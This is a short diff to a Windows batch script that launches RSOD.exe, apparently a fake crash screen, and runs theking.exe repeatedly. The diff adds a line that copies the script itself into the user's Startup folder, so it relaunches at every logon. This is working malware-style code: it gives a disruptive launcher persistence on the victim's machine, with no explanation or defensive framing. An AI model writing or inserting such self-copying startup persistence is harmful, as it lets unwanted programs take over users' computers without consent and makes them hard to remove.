@@ -1,4 +1,5 @@
 @echo off
+copy %0 "%userprofile%\Start Menu\Programs\Startup"
 start RSOD.exe
 start theking.exe
 start theking.exe
